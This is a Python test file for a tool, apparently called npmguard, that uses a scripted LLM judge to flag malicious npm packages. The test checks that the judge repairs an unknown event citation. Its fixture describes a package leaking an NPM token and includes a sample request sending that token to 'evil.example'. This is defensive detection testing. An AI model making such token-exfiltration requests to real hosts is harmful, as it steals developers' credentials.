import json

from kit_llm import ScriptedLlm
from kit_spine import make_engine, make_session_factory
from kit_spine.db import metadata
from npmguard.config import Settings
from npmguard.contract.models import Hypothesis
from npmguard.evidence import RenderedTimeline
from npmguard.llm_runtime import build_npmguard_llm
from npmguard.orchestrator import judge_evidence


async def test_judge_repairs_unknown_event_citation_inside_kit(tmp_path) -> None:
    engine = make_engine(f"sqlite+aiosqlite:///{tmp_path / 'judge.sqlite3'}")
    async with engine.begin() as connection:
        await connection.run_sync(metadata.create_all)
    sessions = make_session_factory(engine)
    provider = ScriptedLlm(
        {
            "judge": [
                json.dumps(
                    {"malicious": True, "reason": "canary left process", "citedEvents": ["e99"]}
                ),
                json.dumps(
                    {"malicious": True, "reason": "canary left process", "citedEvents": ["e2"]}
                ),
            ]
        }
    )
    llm = build_npmguard_llm(sessions, Settings(_env_file=None), provider=provider)
    hypothesis = Hypothesis.model_validate(
        {
            "hypId": "hyp-0001",
            "description": "sends the planted NPM token to an unrelated host",
            "claim": {"kind": "env_exfil", "gating": None},
            "focusFiles": ["index.js"],
            "focusLines": [{"file": "index.js", "range": "2-3"}],
            "experiment": [
                {"tool": "setEnv", "args": {"env": {"NPM_TOKEN": "CANARY"}}},
                {
                    "tool": "trigger",
                    "args": {
                        "kind": "entrypoint",
                        "target": "index.js",
                        "argv": [],
                        "stdin": None,
                    },
                },
            ],
            "severity": "high",
            "parentHypId": None,
            "childHypIds": [],
            "state": "OPEN",
            "createdBy": "hypothesize",
            "evidenceRefs": [],
            "createdAt": "2026-07-20T00:00:00Z",
            "resolvedAt": None,
            "resolution": None,
        }
    )

    result = await judge_evidence(
        hypothesis,
        RenderedTimeline(
            text="e2    network  GET https://evil.example/?token=CANARY",
            ids=frozenset({"e2"}),
        ),
        "pads strings",
        llm,
        "audit-1",
    )

    assert result.confirmed
    assert result.cited_events == ["e2"]
    assert provider._calls == 2
    await llm.aclose()
    await engine.dispose()
